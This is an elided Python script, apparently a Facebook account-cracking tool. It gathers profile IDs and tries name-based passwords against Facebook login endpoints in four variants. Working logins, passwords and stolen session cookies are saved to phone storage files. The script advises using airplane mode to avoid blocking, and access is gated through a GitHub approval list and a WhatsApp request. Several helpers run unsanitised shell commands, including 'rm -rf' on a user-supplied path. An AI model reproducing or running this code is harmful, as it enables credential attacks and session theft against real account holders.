...
#!/usr/bin/python
#Original written By Muhmmad Hashim
...
\033[1;92m    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝
\033[1;92m------------------------------------------------
\033[1;92m Owner   :          Muhammad Hashim
\033[1;92m Facebook:         Muhammad Hashim
\033[1;92m Github  :             HASHIM_NAIB
\033[1;92m Version :            18.8
\033[1;93m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {N}[Naib] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {N}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);naib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Naib_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Naib_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Naib_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {N}[Niab] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {N}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);naib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [Naib-OK] {sid} | {ps} {N}")
                    oks.append(sid)
                    open('/sdcard/Naib_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Naib_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {N}[Naib] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {N}[Naib] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {N}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Naib-OK] {sid} | {ps} {N}")
                    oks.append(sid)
                    open('/sdcard/Naib_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [Naib-CP] {sid} | {ps} {N}")
                    cps.append(sid)
                    open('/sdcard/Naib_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
    ...
    def pasw(self):       
            ...
            print(f"\r{A}Use flight (airplane) mode before use {N}")
            print(47*"-")
    ...
    try:
        ...
        for fbuid in fbidz:
            ...
            try:
                ...
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{N}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/Naib.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Naib.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    os.system('touch ' +hashim)
    os.system('sort -r '+naib+' | uniq > '+hashim)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + naib )
    print(47*'-')
    print("File Saved To :" + hashim )
    print(47*'-')
    input(f"{S} Press Enter To Back Naib Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back Naib Menu ")
        Naib(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    naib = input('Put File Name:')
    print(" ")
    hashim = input('Saving Put File Name:')
    os.system('touch ' +hashim)
    os.system('sort -r '+naib+' | uniq > '+hashim)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + naib )
    print("New File Saved:" + hashim )
    print(47*'-')
    input(f"{N} Press Enter To Back Naib Menu ")
    Naib(allkey)       
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/HASHIMALEE/khan/blob/main/Approval.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923142247695?text='+tks),approval()
      time.sleep(1)
      hashim()
  except:
    sys.exit()
